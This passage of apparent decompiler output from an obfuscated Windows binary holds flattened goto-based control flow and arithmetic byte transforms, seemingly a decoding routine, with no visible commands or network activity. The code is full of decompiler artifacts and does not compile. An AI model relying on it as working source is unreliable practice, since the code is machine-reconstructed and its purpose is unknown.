          bVar15 = cVar10 + bVar2 + (cVar10 + 0x12U & bVar2) * -2 + 0x94;
          uVar13 = uVar13 + 0x93;
          goto LAB_140014852;
        }
        if (uVar13 + 0xf3 < uVar14) {
          bVar15 = ('\x18' - (cVar10 + 0x78U & bVar2)) * '\x02' + bVar2 + cVar10;
          uVar13 = uVar7;
          goto LAB_1400150ed;
        }
        if (uVar14 <= uVar13 + 0x492) {
          uVar14 = uVar13 + 0x47a;
          uVar7 = uVar13 + 0x67a;
        }
      }
    }
    bVar15 = bVar2 + (cVar10 + 0x31U & bVar2) * -2 + -0x26 + cVar10;
    uVar13 = uVar7;
  }
  if (uVar13 + 0x42 <= uVar14) {
    if (uVar14 == uVar13 + 1) {
      bVar15 = (cVar10 + bVar2 + (cVar10 + 0x5eU & bVar2) * -2) - 0x34;
      uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x20] + uVar13 + 1;
    }
    else if (uVar14 == uVar13 + 2) {
      bVar15 = cVar10 + bVar2 + (cVar10 + 0x90U & bVar2) * -2 + 0xa0;
LAB_14001516b:
      uVar11 = uVar11 - bVar15;
    }
    else {
      if (uVar14 == uVar13 + 5) {
        bVar15 = bVar2 + (cVar10 + 0x5cU & bVar2) * -2 + -0x28 + cVar10;
        goto LAB_14001514b;
      }
      if (uVar14 != uVar13 + 3) goto LAB_140014d08;
      bVar15 = (':' - (cVar10 - 0x3eU & bVar2)) * '\x02' + bVar2 + cVar10;
    }
    goto LAB_140014852;
  }
  cVar16 = bVar2 + (cVar10 + 0xb3U & bVar2) * -2 + -0x32;
LAB_140014d05:
  bVar15 = cVar16 + cVar10;
LAB_140014d08:
  if (uVar14 + uVar13 == 1000) {
    bVar15 = ('&' - (cVar10 + 0x1eU & bVar2)) * '\x02' + cVar10;
    goto LAB_140015199;
  }
  if (uVar14 <= uVar13 + 9) {
    if (uVar14 == uVar13 + 1) {
      bVar15 = bVar2 + (cVar10 + 0xdU & bVar2) * -2 + -0x4e + cVar10;
      goto LAB_1400150ed;
    }
    if (uVar14 == uVar13 + 2) {
      bVar15 = (cVar10 + bVar2 + (cVar10 - 0x27U & bVar2) * -2) - 0x16;
    }
    else {
      if (uVar14 == uVar13 + 4) {
        bVar15 = cVar10 + bVar2 + (cVar10 + 0xbU & bVar2) * -2 + 0xbe;
        goto LAB_14001516b;
      }
      if (uVar14 != uVar13 + 5) goto LAB_140014cc5;
      bVar15 = bVar2 + (cVar10 - 0x29U & bVar2) * -2 + -10 + cVar10;
LAB_1400151bc:
      bVar5 = (char)uVar11 + 0x84;
      local_1f8[uVar11 - 0x20] = ('2' - (bVar2 & bVar5)) * '\x02' + bVar2 + bVar5;
      uVar14 = uVar14 + 1;
      lVar18 = uVar11 + (-1 - uVar14);
      uVar11 = lVar18 + (byte)local_1f8[lVar18 + -0x20] + uVar13 + 1;
    }
    goto LAB_140014852;
  }
  bVar15 = cVar10 + 0xa7;
  cVar16 = '\v';
LAB_140014cb9:
  bVar15 = (cVar16 - (bVar15 & bVar2)) * '\x02' + bVar2 + cVar10;
LAB_140014cc5:
  if (0x1f < uVar14) {
    bVar15 = bVar2 * '\x02' + (cVar10 + 0xb8U & bVar2) * -2 + -0x50 + cVar10;
LAB_14001514b:
    local_1f8[uVar11 - 0x20] =
         bVar15 + (cVar10 + 0x6bU & bVar2) * -2 + '\x13' + cVar10 + 0x6bU + bVar2;
LAB_140015168:
    uVar14 = uVar14 + uVar13;
    goto LAB_14001516b;
  }
  if (uVar13 + 1 < uVar14) {
    cVar16 = bVar2 + (cVar10 + 0x56U & bVar2) * -2 + -4;
LAB_140014c88:
    bVar15 = cVar16 + cVar10;
  }
  else {
    if (uVar14 == uVar13 + 1) {
      bVar15 = cVar10 + bVar2 + (cVar10 + 0xbcU & bVar2) * -2 + 0x98;
      uVar11 = uVar11 + (byte)local_1f8[uVar11 - 0x20] + uVar13 + 1;
      goto LAB_140014852;
    }
    if (uVar14 == uVar13 + 3) {
      bVar15 = bVar2 + (cVar10 + 0x88U & bVar2) * -2 + -0x30 + cVar10;
      goto LAB_140015199;
    }
    if (uVar14 == uVar13 + 4) {
      bVar15 = ('\x04' - (cVar10 + 0x54U & bVar2)) * '\x02' + bVar2 + cVar10;
      goto LAB_140015168;
    }
    if (uVar14 == uVar13 + 2) {
      bVar15 = bVar2 + (cVar10 + 0xbaU & bVar2) * -2 + -0x5c + cVar10;
      goto LAB_14001514b;
    }
    if (uVar14 == uVar13 + 7) {
      bVar15 = ('<' - (cVar10 - 0x14U & bVar2)) * '\x02' + bVar2 + cVar10;
      goto LAB_1400150ed;
    }
  }
  if (3 < uVar13) {
    bVar15 = (('\n' - (cVar10 + 0x52U & bVar2)) * '\x02' + bVar2 + cVar10) * '\x02';
    goto LAB_1400150ed;
  }
LAB_140014c68:
  local_1f8[uVar11 - 0x20] = bVar15;
  uVar11 = uVar11 + 1;
  goto LAB_140014852;
code_r0x000140015ee8:
  bVar15 = bVar2 + (bVar2 & cVar10 + 0xeU) * -2 + -0x62 + cVar10 + 0xeU;
LAB_140015f40:
  if (uVar17 < uVar11) {
    in_stack_011772be = in_stack_0153fbb0;
    goto LAB_14001691e;
  }
  if (uVar13 < uVar11 + 100) {
    bVar15 = ('\x0e' - (cVar10 + 0x26U & bVar2)) * '\x02' + cVar10 + bVar2;
  }
  else {
    if (uVar13 == uVar11 + 1) {
      cVar16 = (':' - (cVar10 + 0x42U & bVar2)) * '\x02' + cVar10;
      goto LAB_14001679e;
    }
    if (uVar13 == uVar11 + 2) {
      bVar15 = cVar10 + 0x7a;
      cVar16 = '\x12';
      goto LAB_1400167d2;
    }
    if (uVar13 == uVar11 + 5) {
      bVar15 = ('\x16' - (cVar10 - 0x32U & bVar2)) * '\x02' + cVar10 + bVar2;
      goto LAB_140016803;
    }
    if (uVar13 == uVar11 + 3) {
      cVar16 = cVar10 + (cVar10 - 0x16U & bVar2) * -2 + -0x7c;
      goto LAB_140016833;
    }
    if (uVar13 == uVar11 + 2) {
      bVar15 = ('\x1a' - (cVar10 + 0x22U & bVar2)) * '\x02' + cVar10 + bVar2;
      uVar17 = uVar17 + *(byte *)((longlong)local_148 + (uVar17 - 0x70)) + uVar11 + 1;
      goto LAB_140015ec3;
    }
  }
  while( true ) {
    uVar7 = uVar11;
    if (uVar11 + uVar13 <= uVar17) break;
    while( true ) {
      uVar11 = uVar7;
      if (uVar13 == uVar11 + 0x42) {
        cVar16 = cVar10 + (cVar10 + 4U & bVar2) * -2 + -0x18;
        goto LAB_14001679e;
      }
      if (uVar13 == uVar11 + 0x28) {
        bVar15 = (' ' - (cVar10 + 0x20U & bVar2)) * '\x02' + cVar10 + bVar2;
        uVar11 = uVar11 + 1;
        goto LAB_140015ec3;
      }
      if (uVar13 == uVar11 + 0x400) {
        bVar15 = cVar10 + (cVar10 + 0x3cU & bVar2) * -2 + -0x68 + bVar2;
        goto LAB_140015ec3;
      }
      if (uVar13 == uVar11 + 0x200) {
        cVar16 = cVar10 + (cVar10 + 0x58U & bVar2) * -2 + -0x10;
        goto LAB_1400166ca;
      }
      if (uVar13 == uVar11 + 100) {
        bVar15 = ('$' - (cVar10 + 0x74U & bVar2)) * '\x02' + cVar10 + bVar2;
        goto LAB_140016800;
      }
      uVar14 = uVar11 + 0x40;
      if (uVar13 == uVar14) {
        bVar15 = cVar10 + (cVar10 + 0x90U & bVar2) * -2 + -0x60 + bVar2;
        goto LAB_140016803;
      }
      if (uVar13 == uVar11 + 0x20) {
        cVar16 = cVar10 + (cVar10 + 0xacU & bVar2) * -2 + -8;
        goto LAB_140016833;
      }
      if (uVar13 == uVar11 + 10) {
        bVar15 = ('(' - (cVar10 - 0x38U & bVar2)) * '\x02' + cVar10 + bVar2;
        goto LAB_140016860;
      }
      if (uVar13 == uVar11 + 0x80) {
        bVar15 = cVar10 + (cVar10 - 0x1cU & bVar2) * -2 + -0x58 + bVar2;
        uVar17 = uVar17 + *(byte *)((longlong)local_148 + (uVar17 - 0x70)) + uVar11 + 1;
        goto LAB_140015ec3;
      }
      uVar7 = uVar11 + 0x68;
      if (uVar14 < uVar11 + 0x88) {
        bVar15 = ('\x02' - (cVar10 + 0x2aU & bVar2)) * '\x02' + cVar10 + bVar2;
        goto LAB_140015eb0;
      }
      if (uVar14 < uVar11 + 0x72) {
        bVar15 = ('.' - (cVar10 + 0x46U & bVar2)) * '\x02' + cVar10 + bVar2;
        goto LAB_140015ec0;
      }
      uVar13 = uVar14;
      if (uVar14 < uVar11 + 0x70) {
        bVar15 = cVar10 + (cVar10 + 0x62U & bVar2) * -2 + -0x4c + bVar2;
        uVar11 = uVar7;
        goto LAB_140015ed6;
      }
      if (uVar14 < uVar11 + 0x6d) {
        bVar15 = ('\x06' - (cVar10 + 0x7eU & bVar2)) * '\x02' + cVar10 + bVar2;
        uVar11 = uVar7;
        goto LAB_140015f40;
      }
      if (uVar14 < uVar11 + 0x90) break;
      uVar1 = uVar11 + 0x78;
      if (uVar14 < uVar1) {
        cVar16 = cVar10 + (cVar10 + 0xb6U & bVar2) * -2 + -0x44;
        uVar11 = uVar7;
        goto LAB_140016355;
      }
      if (uVar14 < uVar11 + 0x71) {
        cVar16 = ('\n' - (cVar10 - 0x2eU & bVar2)) * '\x02' + cVar10;
        uVar11 = uVar7;
        goto LAB_14001631b;
      }
      if (uVar14 < uVar11 + 0x6e) {
        bVar15 = cVar10 - 0x12;
        cVar16 = '6';
        uVar11 = uVar7;
        goto LAB_1400162d8;
      }
      if (uVar14 < uVar11 + 0x6c) {
        bVar15 = cVar10 + (cVar10 + 10U & bVar2) * -2 + -0x3c + bVar2;
        uVar11 = uVar7;
        goto LAB_1400162bd;
      }
      if (uVar11 + 0x6a <= uVar14) {
        uVar7 = uVar11 + 0x82;
        uVar13 = uVar1;
        if (uVar11 + 0x8b < uVar1) {
          bVar15 = ('\x10' - (cVar10 + 0x50U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar17 = uVar17 + *(byte *)((longlong)local_148 + (uVar17 - 0x70)) + uVar7 + 1;
          uVar11 = uVar7;
          goto LAB_140015ec3;
        }
        if (uVar11 + 0x88 < uVar1) {
          bVar15 = ('<' - (cVar10 + 0x6cU & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar11 = uVar7;
          goto LAB_140016860;
        }
        if (uVar11 + 0x86 < uVar1) {
          cVar16 = cVar10 + (cVar10 + 0x88U & bVar2) * -2 + -0x30;
          uVar11 = uVar7;
          goto LAB_140016833;
        }
        if (uVar11 + 0x84 < uVar1) {
          bVar15 = ('\x14' - (cVar10 + 0xa4U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar11 = uVar7;
          goto LAB_140016803;
        }
        if (uVar11 + 0xac < uVar1) {
          bVar15 = cVar10 + (cVar10 - 0x40U & bVar2) * -2 + -0x80 + bVar2;
          uVar11 = uVar7;
          goto LAB_140016800;
        }
        if (uVar11 + 0x8a < uVar1) {
          cVar16 = cVar10 + (cVar10 - 0x24U & bVar2) * -2 + -0x28;
          uVar11 = uVar7;
          goto LAB_1400166ca;
        }
        if (uVar11 + 0x87 < uVar1) {
          bVar15 = cVar10 - 8;
          cVar16 = '\x18';
          uVar11 = uVar7;
          goto LAB_1400167d2;
        }
        if (uVar11 + 0x85 < uVar1) {
          bVar15 = cVar10 + (cVar10 + 0x14U & bVar2) * -2 + -0x78 + bVar2;
          uVar11 = uVar11 + 0x83;
          goto LAB_140015ec3;
        }
        if (uVar11 + 0x83 < uVar1) {
          cVar16 = cVar10 + (cVar10 + 0x30U & bVar2) * -2 + -0x20;
          uVar11 = uVar7;
          goto LAB_14001679e;
        }
        if (uVar1 <= uVar11 + 0xdc) {
          uVar13 = uVar11 + 0xc3;
          uVar7 = uVar11 + 0x13d;
        }
      }
    }
    bVar15 = ('2' - (cVar10 + 0x9aU & bVar2)) * '\x02' + cVar10 + bVar2;
    uVar11 = uVar7;
  }
  if (uVar11 + 0x40 <= uVar13) {
    if (uVar13 == uVar11 + 1) {
      bVar15 = ('\x1c' - (cVar10 + 0x4cU & bVar2)) * '\x02' + cVar10 + bVar2;
      uVar17 = uVar17 + *(byte *)((longlong)local_148 + (uVar17 - 0x70)) + uVar11 + 1;
    }
    else {
      if (uVar13 != uVar11 + 3) {
        if (uVar13 == uVar11 + 5) {
          bVar15 = cVar10 + (cVar10 + 0xbcU & bVar2) * -2 + -0x68 + bVar2;
          goto LAB_140016800;
        }
        if (uVar13 == uVar11 + 4) {
          bVar15 = cVar10 - 0xc;
          cVar16 = '$';
          goto LAB_1400167d2;
        }
        if (uVar13 == uVar11 + 6) {
          cVar16 = cVar10 + (cVar10 + 0x2cU & bVar2) * -2 + -8;
          goto LAB_14001679e;
        }
        goto LAB_140016358;
      }
      bVar15 = (' ' - (cVar10 + 0xa0U & bVar2)) * '\x02' + cVar10 + bVar2;
LAB_140016803:
      uVar17 = uVar17 - bVar15;
    }
    goto LAB_140015ec3;
  }
  cVar16 = cVar10 + (cVar10 + 0xeU & bVar2) * -2 + -0x54;
LAB_140016355:
  bVar15 = cVar16 + bVar2;
LAB_140016358:
  if (uVar11 + uVar13 == 3) {
    bVar15 = ('\x1c' - (cVar10 - 0x34U & bVar2)) * '\x02' + cVar10;
LAB_140016836:
    bVar5 = ('\x05' - (cVar10 - 0x26U & bVar2)) * '\x02' + (cVar10 - 0x26U) + bVar2;
    *(byte *)((longlong)local_148 + (uVar17 - 0x70)) = bVar5;
    uVar17 = uVar17 - ((ulonglong)bVar5 + uVar11 + 1);
    uVar11 = uVar11 + 1;
LAB_140016860:
    bVar5 = (char)uVar17 - 0x18;
    *(byte *)((longlong)local_148 + (uVar17 - 0x70)) = bVar5 + (bVar5 & bVar2) * -2 + -0x58 + bVar2;
    lVar12 = uVar17 + (-1 - (uVar13 + 1));
    uVar17 = lVar12 + *(byte *)((longlong)local_148 + lVar12 + -0x70) + uVar11 + 1;
    uVar13 = uVar13 + 1;
  }
  else {
    if (uVar11 + 2 < uVar13) {
      cVar16 = cVar10 + (cVar10 + 0x56U & bVar2) * -2 + -4;
LAB_14001631b:
      bVar15 = cVar16 + bVar2;
LAB_14001631e:
      if (0x29 < uVar13) {
        cVar16 = cVar10 + (cVar10 + 0xb0U & bVar2) * -2 + -0x20 + bVar2;
LAB_1400166ca:
        bVar15 = cVar16 + bVar2;
        *(byte *)((longlong)local_148 + (uVar17 - 0x70)) =
             cVar10 + 0xbeU + (cVar10 + 0xbeU & bVar2) * -2 + -0x32 + bVar15 + bVar2;
        goto LAB_140016800;
      }
      if (uVar11 + 0x5a < uVar13) {
        bVar15 = cVar10 + 0x7c;
        cVar16 = '\f';
LAB_1400162d8:
        bVar15 = (cVar16 - (bVar15 & bVar2)) * '\x02' + cVar10 + bVar2;
      }
      else {
        if (uVar13 == uVar11 + 1) {
          bVar15 = ('8' - (cVar10 + 0x98U & bVar2)) * '\x02' + cVar10 + bVar2;
          uVar17 = uVar17 + *(byte *)((longlong)local_148 + (uVar17 - 0x70)) + uVar11 + 1;
          goto LAB_140015ec3;
        }
        if (uVar13 == uVar11 + 3) {
          cVar16 = ('\x10' - (cVar10 - 0x30U & bVar2)) * '\x02' + cVar10;
          goto LAB_140016833;
        }
        if (uVar13 == uVar11 + 2) {
          cVar16 = ('\x14' - (cVar10 + 0x24U & bVar2)) * '\x02' + cVar10;
          goto LAB_1400166ca;
        }
        if (uVar13 == uVar11 + 2) {
          cVar16 = ('\x18' - (cVar10 + 0x78U & bVar2)) * '\x02' + cVar10;
          goto LAB_14001679e;
        }
      }
      if (uVar11 < 0x7a) {
LAB_1400162bd:
        *(byte *)((longlong)local_148 + (uVar17 - 0x70)) = bVar15;
        uVar17 = uVar17 + 1;
        goto LAB_140015ec3;
      }
      bVar15 = (('\x04' - (cVar10 + 0x94U & bVar2)) * '\x02' + cVar10 + bVar2) * '\x02';
    }
    else {
      if (uVar13 != uVar11 + 1) {
        if (uVar13 == uVar11 + 3) {
          bVar15 = cVar10 + 0xaa;
          cVar16 = '\x02';
          goto LAB_1400167d2;
        }
        if (uVar13 == uVar11 + 4) {
          cVar16 = ('.' - (cVar10 - 0x3aU & bVar2)) * '\x02' + cVar10;
          goto LAB_1400166ca;
        }
        if (uVar13 == uVar11 + 2) {
          bVar15 = cVar10 + (cVar10 - 0x1eU & bVar2) * -2 + -0x4c + bVar2;
          goto LAB_140016800;
        }
        if (uVar13 != uVar11 + 5) goto LAB_14001631e;
        bVar15 = cVar10 + (cVar10 + 0x36U & bVar2) * -2 + -0x44 + bVar2;
        goto LAB_140016860;
      }
      cVar16 = ('*' - (cVar10 + 0x72U & bVar2)) * '\x02' + cVar10;
LAB_14001679e:
      bVar15 = cVar16 + bVar2;
    }
    *(byte *)((longlong)local_148 + (uVar17 - 0x70)) =
         cVar10 + 0xa2U + (cVar10 + 0xa2U & bVar2) * -2 + -0x6e + bVar2;
    uVar11 = uVar11 + 1;
  }
  goto LAB_140015ec3;
code_r0x0001400169b2:
  uVar17 = (ulonglong)(byte)((bVar15 - 0x24) + (bVar15 - 0x24 & bVar2) * -2 + -4 + bVar2);
LAB_1400169f8:
  uVar3 = (uint)uVar11 & 0xff;
LAB_140016a00:
  if (uVar11 < uVar13) {
    in_stack_00763d14 = in_stack_0176aa38;
    goto LAB_14001747c;
  }
  bVar5 = bVar15;
  if (uVar13 + 4 <= uVar14) {
    if (uVar14 == uVar13 + 1) {
      bVar5 = bVar15 - 0x3c;
      cVar10 = '4';
      goto LAB_140017323;
    }
    if (uVar14 != uVar13 + 2) {
      if (uVar14 != uVar13 + 3) {
        if (uVar14 == uVar13 + 5) {
          cVar10 = ('\x1c' - (bVar15 - 0x34 & bVar2)) * '\x02' + bVar2;
          goto LAB_140017293;
        }
        if (uVar14 != uVar13 + 4) goto LAB_140016a70;
        uVar17 = (ulonglong)(byte)((bVar15 + bVar2 + (bVar15 + 0x84 & bVar2) * -2) - 0x18);
        uVar11 = uVar11 + *(byte *)((longlong)local_148 + (uVar11 - 0x50)) + uVar13 + 1;
        goto LAB_140016983;
      }
      cVar10 = ('<' - (bVar15 - 0x14 & bVar2)) * '\x02' + bVar2;
      goto LAB_1400173bc;
    }
    uVar17 = (ulonglong)(byte)(('\f' - (bVar15 + 0x7c & bVar2)) * '\x02' + bVar2 + bVar15);
    uVar13 = uVar13 + 1;
    goto LAB_140016983;
  }
  uVar17 = (ulonglong)(byte)(bVar2 + (bVar15 + 0xc & bVar2) * -2 + -0x48 + bVar15);
LAB_140016a70:
  while( true ) {
    uVar7 = uVar13;
    if (uVar13 + uVar14 <= uVar11) break;
    while( true ) {
      do {
        uVar13 = uVar7;
        if (uVar14 == uVar13 + 4) {
          cVar10 = bVar2 + (bVar15 + 0x88 & bVar2) * -2 + -0x30;
          goto LAB_14001732f;
        }
        if (uVar14 == uVar13 + 9) {
          uVar17 = (ulonglong)(byte)(bVar15 + bVar2 + (bVar15 + 0x40 & bVar2) * -2 + 0x80);
          uVar13 = uVar13 + 1;
          goto LAB_140016983;
        }
        if (uVar14 == uVar13 + 0x61) {
          uVar17 = (ulonglong)(byte)(('\x18' - (bVar15 - 8 & bVar2)) * '\x02' + bVar2 + bVar15);
          goto LAB_140016983;
        }
        if (uVar14 == uVar13 + 10) goto LAB_14001701b;
        if (uVar14 == uVar13 + 0x7a) {
          uVar17 = (ulonglong)(byte)(bVar15 + bVar2 + (bVar15 + 0x68 & bVar2) * -2 + 0x90);
          goto LAB_1400173e3;
        }
        if (uVar14 == uVar13 + 1) {
          uVar17 = (ulonglong)(byte)((' ' - (bVar15 + 0x20 & bVar2)) * '\x02' + bVar2 + bVar15);
          goto LAB_1400173e6;
        }
        if (uVar14 == uVar13 + 0x42) {
          cVar10 = bVar2 + (bVar15 - 0x28 & bVar2) * -2 + -0x10;
          goto LAB_14001721f;
        }
        if (uVar14 == uVar13 + 2) {
          cVar10 = bVar2 + (bVar15 + 0x90 & bVar2) * -2 + -0x60;
          goto LAB_140017293;
        }
        if (uVar14 == uVar13 + 100) {
          uVar17 = (ulonglong)(byte)(('(' - (bVar15 + 0x48 & bVar2)) * '\x02' + bVar2 + bVar15);
          uVar11 = uVar11 + *(byte *)((longlong)local_148 + (uVar11 - 0x50)) + uVar13 + 1;
          goto LAB_140016983;
        }
        uVar7 = uVar13;
      } while (uVar14 == uVar13 + 0x400);
      uVar14 = uVar13 + 5;
      uVar7 = uVar13 + 0xd;
      if (uVar14 < uVar13 + 0x17) {
        bVar15 = bVar15 + bVar2 + (bVar15 + 0x94 & bVar2) * -2 + 0x88;
        goto LAB_140016970;
      }
      if (uVar14 < uVar13 + 0x87) {
        bVar15 = ('\x1c' - (bVar15 + 0x4c & bVar2)) * '\x02' + bVar2 + bVar15;
        goto LAB_140016980;
      }
      uVar17 = uVar13 + 0x1d;
      if (uVar14 < uVar17) {
        uVar17 = (ulonglong)(byte)(bVar2 + (bVar15 + 4 & bVar2) * -2 + -0x18 + bVar15);
        uVar13 = uVar7;
        goto LAB_1400169a0;
      }
      if (uVar14 < uVar13 + 0x4e) {
        uVar17 = (ulonglong)(byte)(bVar2 + (bVar15 + 0xbc & bVar2) * -2 + -0x68 + bVar15);
        uVar13 = uVar7;
        goto LAB_140016a00;
      }
      if (uVar14 < uVar13 + 0xf) break;
      if (uVar14 < uVar13 + 0x71) {
        cVar10 = bVar2 + (bVar15 + 0x2c & bVar2) * -2 + -8;
        uVar13 = uVar7;
        goto LAB_140016e46;
      }
      if (uVar14 < uVar13 + 0x10) {
        cVar10 = bVar2 + (bVar15 - 0x1c & bVar2) * -2 + -0x58;
        uVar13 = uVar7;
        goto LAB_140016e0a;
      }
      if (uVar14 < uVar13 + 0x8d) {
        bVar5 = bVar15 + 0x9c;
        cVar10 = ',';
        uVar13 = uVar7;
        goto LAB_140016dc5;
      }
      if (uVar14 < uVar13 + 0x100d) {
        uVar17 = (ulonglong)(byte)(('\x04' - (bVar15 + 0x54 & bVar2)) * '\x02' + bVar2 + bVar15);
        uVar13 = uVar7;
        goto LAB_140016da9;
      }
      if (uVar13 + 0x16 <= uVar14) {
        uVar7 = uVar13 + 0x7e;
        uVar14 = uVar17;
        if (uVar13 + 0xbf < uVar17) {
          uVar17 = (ulonglong)(byte)((' ' - (bVar15 + 0xa0 & bVar2)) * '\x02' + bVar2 + bVar15);
          uVar11 = uVar11 + *(byte *)((longlong)local_148 + (uVar11 - 0x50)) + uVar7 + 1;
          uVar13 = uVar7;
          goto LAB_140016983;
        }
        if (uVar13 + 0x9e < uVar17) {
          cVar10 = bVar2 + (bVar15 + 0x58 & bVar2) * -2 + -0x10;
          uVar13 = uVar7;
          goto LAB_140017293;
        }
        if (uVar13 + 0xd8 < uVar17) {
          cVar10 = bVar2 + (bVar15 + 0x10 & bVar2) * -2 + -0x60;
          uVar13 = uVar7;
          goto LAB_14001721f;
        }
        if (uVar13 + 0x81 < uVar17) {
          uVar17 = (ulonglong)(byte)(('(' - (bVar15 - 0x38 & bVar2)) * '\x02' + bVar2 + bVar15);
          uVar13 = uVar7;
          goto LAB_1400173e6;
        }
        if (uVar13 + 0xfe < uVar17) {
          uVar17 = (ulonglong)(uVar3 + (byte)(bVar2 + (bVar15 + 0x80 & bVar2) * -2));
          uVar13 = uVar7;
          goto LAB_1400173e3;
        }
        if (uVar13 + 0x82 < uVar17) {
          cVar10 = bVar2 + (bVar15 + 0x38 & bVar2) * -2 + -0x50;
          uVar13 = uVar7;
          goto LAB_1400173bc;
        }
        if (uVar13 + 0x27e < uVar17) {
          uVar17 = (ulonglong)(byte)(('0' - (bVar15 - 0x10 & bVar2)) * '\x02' + bVar2 + bVar15);
          uVar13 = uVar7;
          goto LAB_140016983;
        }
        if (uVar13 + 0xdf < uVar17) {
          uVar17 = (ulonglong)(byte)(('\b' - (bVar15 + 0xa8 & bVar2)) * '\x02' + bVar2 + bVar15);
          uVar13 = uVar13 + 0x7f;
          goto LAB_140016983;
        }
        if (uVar13 + 0x88 < uVar17) {
          cVar10 = bVar2 + (bVar15 + 0x60 & bVar2) * -2 + -0x40;
          uVar13 = uVar7;
          goto LAB_14001732f;
        }
        if (uVar17 <= uVar13 + 0xf8) {
          uVar14 = uVar13 + 0xd8;
          uVar7 = uVar13 + 0xe8;
        }
      }
    }
    uVar17 = (ulonglong)(byte)(('$' - (bVar15 + 0x74 & bVar2)) * '\x02' + bVar2 + bVar15);
    uVar13 = uVar7;
  }
  if (uVar13 + 8 <= uVar14) {
    if (uVar14 == uVar13 + 1) {
      uVar17 = (ulonglong)(byte)(('8' - (bVar15 + 0x18 & bVar2)) * '\x02' + bVar2 + bVar15);
      uVar11 = uVar11 + *(byte *)((longlong)local_148 + (uVar11 - 0x50)) + uVar13 + 1;
    }
    else {
      if (uVar14 == uVar13 + 2) {
        cVar10 = bVar2 + (bVar15 + 0x88 & bVar2) * -2 + -0x30;
        goto LAB_14001721f;
      }
      if (uVar14 == uVar13 + 3) {
        uVar17 = (ulonglong)(byte)(('\x18' - (bVar15 - 8 & bVar2)) * '\x02' + bVar2 + bVar15);
        goto LAB_1400173e3;
      }
      if (uVar14 == uVar13 + 5) {
LAB_14001701b:
        cVar10 = bVar2 + (bVar15 + 0xb0 & bVar2) * -2 + -0x20;
        goto LAB_1400173bc;
      }
      if (uVar14 != uVar13 + 4) goto LAB_140016e49;
      uVar17 = (ulonglong)(byte)(bVar15 + bVar2 + (bVar15 + 0x68 & bVar2) * -2 + 0x90);
    }
    goto LAB_140016983;
  }
  cVar10 = bVar2 + (bVar15 - 0x24 & bVar2) * -2 + -0x28;
LAB_140016e46:
  uVar17 = (ulonglong)(byte)(cVar10 + bVar15);
LAB_140016e49:
  if (uVar13 + uVar14 == 9) {
    cVar10 = ('8' - (bVar15 + 0x18 & bVar2)) * '\x02';
LAB_14001721f:
    bVar5 = ('*' - (bVar2 & bVar15 - 0xc)) * '\x02' + bVar2 + (bVar15 - 0xc);
    *(byte *)((longlong)local_148 + (uVar11 - 0x50)) = bVar5;
    uVar11 = uVar11 - ((ulonglong)bVar5 + uVar13 + 1);
    uVar13 = uVar13 + 1;
LAB_140017293:
    uVar17 = (ulonglong)(byte)(cVar10 + bVar15);
    bVar15 = (char)uVar11 - 0x30;
    *(byte *)((longlong)local_148 + (uVar11 - 0x50)) =
         ('(' - (bVar2 & bVar15)) * '\x02' + bVar2 + bVar15;
    lVar12 = uVar11 + (-1 - (uVar14 + 1));
    uVar11 = lVar12 + *(byte *)((longlong)local_148 + lVar12 + -0x50) + uVar13 + 1;
    uVar14 = uVar14 + 1;
  }
  else {
    if (uVar14 <= uVar13 + 0x400) {
      if (uVar14 == uVar13 + 1) {
        bVar5 = bVar15 + 0x24;
        cVar10 = '\x14';
LAB_140017323:
        cVar10 = (cVar10 - (bVar5 & bVar2)) * '\x02' + bVar2;
LAB_14001732f:
        uVar17 = (ulonglong)(byte)(cVar10 + bVar15);
        goto LAB_140017332;
      }
      if (uVar14 == uVar13 + 4) {
        uVar17 = (ulonglong)(byte)((bVar15 + bVar2 + (bVar15 + 4 & bVar2) * -2) - 0x18);
        goto LAB_1400173e3;
      }
      if (uVar14 == uVar13 + 5) {
        uVar17 = (ulonglong)(byte)(bVar15 + bVar2 + (bVar15 + 0xbc & bVar2) * -2 + 0x98);
LAB_1400173e6:
        uVar11 = uVar11 - (uVar17 & 0xff);
      }
      else {
        if (uVar14 == uVar13 + 2) {
          cVar10 = ('$' - (bVar15 + 0x74 & bVar2)) * '\x02' + bVar2;
          goto LAB_14001721f;
        }
        if (uVar14 == uVar13 + 6) {
          cVar10 = bVar2 + (bVar15 + 0x2c & bVar2) * -2 + -8;
          goto LAB_140017293;
        }
        if (uVar14 != uVar13 + 2) goto LAB_140016e0d;
        uVar17 = (ulonglong)(byte)(bVar15 + bVar2 + (bVar15 - 0x1c & bVar2) * -2 + 0xa8);
        uVar11 = uVar11 + *(byte *)((longlong)local_148 + (uVar11 - 0x50)) + uVar13 + 1;
      }
      goto LAB_140016983;
    }
    cVar10 = ('<' - (bVar15 + 0x6c & bVar2)) * '\x02' + bVar2;
LAB_140016e0a:
    uVar17 = (ulonglong)(byte)(cVar10 + bVar15);
LAB_140016e0d:
    if (0x79 < uVar14) {
      cVar10 = bVar2 * '\x02' + (bVar15 + 0x60 & bVar2) * -2 + -0x40;
      goto LAB_1400173bc;
    }
    if (uVar13 + 0x5a < uVar14) {
      bVar5 = bVar15 + 0x78;
      cVar10 = '\x18';
LAB_140016dc5:
      uVar17 = (ulonglong)(byte)((cVar10 - (bVar5 & bVar2)) * '\x02' + bVar2 + bVar15);
    }
    else {
      if (uVar14 == uVar13 + 1) {
        uVar17 = (ulonglong)(byte)((bVar15 + bVar2 + (bVar15 + 0x30 & bVar2) * -2) - 0x20);
        uVar11 = uVar11 + *(byte *)((longlong)local_148 + (uVar11 - 0x50)) + uVar13 + 1;
        goto LAB_140016983;
      }
      if (uVar14 == uVar13 + 2) {
        cVar10 = (' ' - (bVar15 + 0xa0 & bVar2)) * '\x02' + bVar2;
        goto LAB_14001721f;
      }
      if (uVar14 == uVar13 + 5) {
        cVar10 = ('(' - (bVar15 - 0x38 & bVar2)) * '\x02' + bVar2;
        goto LAB_1400173bc;
      }
      if (uVar14 == uVar13 + 7) {
        uVar17 = (ulonglong)(uVar3 + (byte)(bVar2 + (bVar15 + 0x80 & bVar2) * -2));
        goto LAB_140016983;
      }
      if (uVar14 == uVar13 + 3) {
        bVar5 = bVar15 - 0x10;
        cVar10 = '0';
        goto LAB_140017323;
      }
    }
    if (uVar13 < 0x20) {
LAB_140016da9:
      *(char *)((longlong)local_148 + (uVar11 - 0x50)) = (char)uVar17;
      uVar11 = uVar11 + 1;
    }
    else {
      uVar17 = (ulonglong)
